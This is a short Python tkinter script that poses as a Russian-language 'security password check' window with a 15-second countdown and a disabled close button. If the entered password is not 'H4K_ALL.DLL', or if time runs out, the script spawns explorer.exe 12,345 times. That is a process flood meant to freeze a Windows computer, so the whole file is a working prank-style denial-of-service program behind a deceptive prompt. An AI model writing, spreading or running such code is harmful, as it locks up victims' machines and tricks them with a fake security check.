import tkinter
import tempfile
import base64
import zlib
from tkinter import font as tkFont
import subprocess
from sys import exit

ICON = zlib.decompress(base64.b64decode('eJxjYGAEQgEBBiDJwZDBy'
                                        'sAgxsDAoAHEQCEGBQaIOAg4sDIgACMUj4JRMApGwQgF/ykEAFXxQRc='))

_, ICON_PATH = tempfile.mkstemp()
with open(ICON_PATH, 'wb') as icon_file:
    icon_file.write(ICON)

mainwin = tkinter.Tk()
mainwin.iconbitmap(default=ICON_PATH)
mainwin.title("Проверка пароля безопасности")
mainwin.geometry('352x64')
mainwin.resizable(width=False, height=False)

font1 = tkFont.Font(size=20)

sec = 15


def timer():
    global sec
    sec -= 1
    p.config(text=f'Введите пароль({sec}):')
    mainwin.after(1000, timer)


password = tkinter.Entry(mainwin, width='15', font='font1', bg='#ffffff', bd=1, fg='#000000', justify='left',
                         show="•")

p = tkinter.Label(mainwin, text=f'Введите пароль({sec}):')
p.pack()

password.pack(pady=5, padx=5, side='left')

a = ''


def getpass():
    a = password.get()
    if a == 'H4K_ALL.DLL':
        exit()
    else:
        for i in range(12345):
            subprocess.Popen('explorer.exe')
        exit()


def closepass():
    if a != 'H4K_ALL.DLL':
        for i in range(12345):
            subprocess.Popen('explorer.exe')
        exit()


def on_closing():
    pass


ok_button = tkinter.Button(mainwin, bd=1, bg='#ccc', command=getpass, height='1', width='13', text='ОК',
                           relief=tkinter.FLAT,
                           highlightthickness=1).pack(side='right', padx=5)
mainwin.after(15000, closepass)
mainwin.after(1000, timer)
mainwin.protocol("WM_DELETE_WINDOW", on_closing)
mainwin.mainloop()

